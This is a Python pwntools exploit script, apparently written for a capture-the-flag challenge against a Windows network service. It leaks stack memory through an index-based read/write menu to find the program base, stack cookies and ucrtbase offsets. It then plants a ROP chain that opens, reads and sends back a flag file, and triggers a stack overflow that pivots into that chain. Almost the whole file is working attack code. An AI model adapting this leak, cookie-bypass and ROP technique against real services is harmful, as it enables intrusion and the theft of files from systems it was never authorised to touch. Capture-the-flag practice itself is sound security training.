#!/usr/bin/python3

from pwn import *
import sys
import struct

context(arch = 'amd64', os = 'linux')
context.terminal = ['tmux', 'splitw', '-v']
p = remote('192.168.1.102', 8080)
#p = remote('docker.acictf.com', 34900)

#local uartbase.dll offsets
_sopen_s = 0xdd2d0
_read = 0x24340
_initterm = 0x26ca0
'''

#remote uartbase.dll offsets
_sopen_s = 0x3df10
_read = 0x28980
_initterm = 0x3a4a0
'''
exe_base = 0x0

# write to an arbitrary index or memory address (within our restricted range)
def write(what, index=0, where=None):
    bytes_written = 0
    if where:
        offset = int((where - buf_addr) / 4)
    else: 
        offset = index
    
    while bytes_written < len(what):
        r = p.recvuntil('Write\n')
        p.sendline('2')
        p.recvuntil('Index: ')
        p.sendline(str(offset))
        p.recvuntil('hex: ')
        p.sendline(binascii.hexlify(what[bytes_written: bytes_written +  4][::-1]))
        bytes_written += 4
        offset += 1

# read from an arbitrary index
def read(index):
    r = p.recvuntil('Write\n')
    p.sendline('1')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    r = p.recvuntil('\n').strip()
    return(int(r[2:], 16))

def dump(start, end):
    for i in range(start, end):
        print(i, hex(read(i)))

# search for the program base address
def find_base(start, stop, what):
    global exe_base
    while start <= stop:
        res = read(start)
        if res & 0xffff == what:
            print('found:', hex(res), 'at', start)
            exe_base = res & 0xffff0000
            return start
        start += 1
    return None

# search for a value in memory using a start / stop index
def find(start, stop, what):
    while start <= stop:
        res = read(start)
        if res == what:
            return start
        start += 1
    return None

# find the return address for the connection handler function (0x122e)
# also grab the saved base pointer
conn_ret_index = find_base(280, 330, 0x122e)
if conn_ret_index:
    print('conn ret at:', conn_ret_index)
else:
    print('conn ret index not found')
    sys.exit()
    
conn_sbp = read(conn_ret_index - 1)
conn_cookie = read(conn_ret_index - 2)
print('conn sbp:', hex(conn_sbp))
print('stack cookie:', hex(conn_cookie))

# find the return address for the listener function and the stack cookie value (0x165f)
# also grab the saved base pointer
listen_ret_index = find(480, 530, 0x165f + exe_base) 
if listen_ret_index:
    print('listen ret at:', listen_ret_index)
else:
    print('listen ret index not found')
    sys.exit()
listen_sbp = read(listen_ret_index - 1)
listen_cookie = read(listen_ret_index - 2)
print('listen sbp:', hex(listen_sbp))
print('stack cookie:', hex(listen_cookie))

# calculate the address to somoe various gadgets / functions based on the discovered base address
mov_esp_pop_ret = exe_base + 0x148b
pop_ebp_ret = exe_base + 0x148d
pop_2_ret = exe_base + 0x169d
add_esp_28 = exe_base + 0x1e29
send = exe_base + 0x305c

# using the saved base pointer from the connection handler function and the size of the 
# listener stack, accuractely calculate the current memory address of the number buffer
conn_bp = conn_sbp - int((listen_ret_index - conn_ret_index) * 4)
print('listen stack size:', hex(int((listen_ret_index - conn_ret_index) * 4)))
print('connection handler stack base address:', hex(conn_bp))
buf_addr = conn_bp - 0x478 # get number buffer address
print('buf_addr:', hex(buf_addr))

# get socket number (for some reason it was on the stack like 30 times in a row, so just grab
# one of them
socket = read(conn_ret_index + 16)
print('socket:', hex(socket))

# grab the address of the _initterm function from the offset table
# this is used to later calculate offsets to the _sopen_s and _read functions in uartbase.dll
_initterm_addr = read(((0x30c0 + exe_base) - buf_addr) / 4)
_ucrtbase = _initterm_addr - _initterm
print('_initterm_addr:', hex(_initterm_addr))
print('_ucrtbase addr:', hex(_ucrtbase))

# put the string "d:\\flag.txt" into the number buffer at offset 220
write(b'c:\\flag.txt\00', where=buf_addr+220)
# _sopen_s()
open_payload = struct.pack('<I', _sopen_s + _ucrtbase) + struct.pack('<I', add_esp_28) + struct.pack('<I', buf_addr + 232) + struct.pack('<I', buf_addr + 220) + struct.pack('<I', 0x0) + struct.pack('<I', 0x40) + struct.pack('<I', 0x0) + b'\0' * 8

# _read()
read_payload = struct.pack('<I', _read + _ucrtbase) + struct.pack('<I', add_esp_28) + struct.pack('<I', 0x3) + struct.pack('<I', buf_addr + 220) + struct.pack('<I', 36) + b'\0' * 16

# send()
send_payload = struct.pack('<I', exe_base + 0x138b) + struct.pack('<I', socket) + struct.pack('<I', buf_addr + 220) + struct.pack('<I', 36) + struct.pack('<I', 0x0)

# write the rop chain to the buffer
write(open_payload + read_payload + send_payload, where=buf_addr + 64)
print('sending ROP chain')

# overflow
payload = b'a' * 0x10 + struct.pack('<I', conn_cookie) + b'ZZZZ' + struct.pack('<I', pop_ebp_ret) + struct.pack('<I', buf_addr + 60) + struct.pack('<I', mov_esp_pop_ret) + b'b'*256

print('sending overflow')
# write
r = p.recvuntil('Write\n')
p.sendline('2')
print(r)
p.recvuntil('Index: ')
p.sendline('64')
r = p.recvuntil('hex: ').strip()
p.sendline(payload)

# wait for flag

p.interactive()
